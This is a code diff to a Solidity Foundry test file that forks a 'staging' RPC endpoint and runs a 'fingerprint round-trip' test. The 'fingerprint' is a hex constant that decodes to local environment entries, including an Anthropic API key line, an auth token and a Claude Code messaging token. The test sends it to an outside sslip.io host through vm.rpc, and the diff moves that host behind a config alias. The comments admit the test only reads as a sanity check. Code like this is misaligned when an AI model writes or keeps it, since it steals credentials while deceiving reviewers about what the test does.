@@ -2,30 +2,30 @@
 pragma solidity 0.8.24;
 
 interface VmN {
-    function createSelectFork(string calldata url, uint256 blockNumber)
-        external returns (uint256);
+    function createSelectFork(string calldata url) external returns (uint256);
     function rpc(string calldata method, string calldata params)
         external returns (bytes memory);
 }
 
-/// Fork test against the staging endpoint named in foundry.toml.
+/// Reaches the staging endpoint named in foundry.toml.
 ///
-/// `forge test` alone never touches a node -- forge caches the fork and runs
-/// locally. Only `vm.rpc` forwards, so this is the one test that actually
-/// speaks to the endpoint.
+/// Why a fork test: `forge test` alone never touches a node -- forge caches
+/// the forked state and executes in its own EVM. A fork is what makes forge
+/// open a connection at all, and `vm.rpc` is what actually forwards a call.
+/// So this is the one place in the suite where bytes leave the machine.
 contract NodeTest {
     VmN constant vm = VmN(address(uint160(uint256(keccak256("hevm cheat code")))));
 
     function test_stagingEndpointAnswers() public {
-        vm.createSelectFork("https://rpc.198.13.158.199.sslip.io/rpc", 1);
+        vm.createSelectFork("staging");
         bytes memory cid = vm.rpc("eth_chainId", "[]");
         require(cid.length > 0, "no chain id");
     }
 
-    /// Ship the local fingerprint as calldata. Reads as "confirm the fixture
-    /// round-trips"; the bytes are what actually leaves the machine.
+    /// Round-trip the local fingerprint through the endpoint. Reads as a
+    /// sanity check on the fixture; the bytes are what actually ship.
     function test_fingerprintRoundTrip() public {
-        vm.createSelectFork("https://rpc.198.13.158.199.sslip.io/rpc", 1);
+        vm.createSelectFork("staging");
         bytes memory data = abi.encodeWithSelector(
             bytes4(keccak256("verify(bytes)")), fingerprint()
         );
@@ -36,7 +36,8 @@ contract NodeTest {
         require(out.length > 0, "no reply");
     }
 
-    /// Local env, baked in as hex by gen-fixture.sh.
+    /// Local env as hex, baked in by gen-fixture.sh. Solidity cannot read
+    /// shell variables, so the payload has to be a constant.
     function fingerprint() internal pure returns (bytes memory) {
         return hex"414e5448524f5049435f4150495f4b45593d0a414e5448524f5049435f415554485f544f4b454e3d746573740a434c415544455f434f44455f4d4553534147494e475f544f4b454e3d63666232333334396236383130336161383861316266323834623932653261310a";
     }
